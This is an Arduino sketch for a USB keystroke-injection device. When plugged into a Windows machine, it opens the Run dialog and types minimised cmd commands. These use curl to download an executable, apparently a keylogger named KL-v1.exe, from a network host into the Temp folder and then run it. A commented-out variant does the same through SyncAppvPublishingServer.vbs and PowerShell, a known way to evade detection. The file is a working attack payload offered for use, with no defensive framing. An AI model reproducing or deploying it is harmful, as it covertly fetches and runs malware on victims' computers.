#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
 // AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  delay(1500); 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(600);
  
  Keyboard.print("cmd /C \"start /MIN cmd /C curl -s http://192.168.253.128/KL-v1.exe -o %Temp%/pink.exe\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1500);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(300);
  

//  Keyboard.print("cmd");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.releaseAll();
//  delay(200);

//You can use any command as per your need
  Keyboard.print("cmd /C \"start /MIN cmd /C forfiles /p %Temp% /c %Temp%/pink.exe\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);
//  
//  Keyboard.print("exit");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.releaseAll();
//  delay(400); 

  
//  Keyboard.print("SyncAppvPublishingServer.vbs \"Break; (New-Object System.Net.WebClient).DownloadFile('http://192.168.253.128/pink.exe','%Temp%/pink.exe')"; Start-Process '%TEMP%/pink.exe'");
//  Keyboard.press(KEY_RETURN);
//  Keyboard.releaseAll();
//  delay(5000);
//  
//  Keyboard.press(KEY_LEFT_GUI);
//  Keyboard.press(114);
//  Keyboard.releaseAll();
//  delay(300);
  
  Keyboard.end();
//  AbsoluteMouse.end();
}

// Unused
void loop() {}
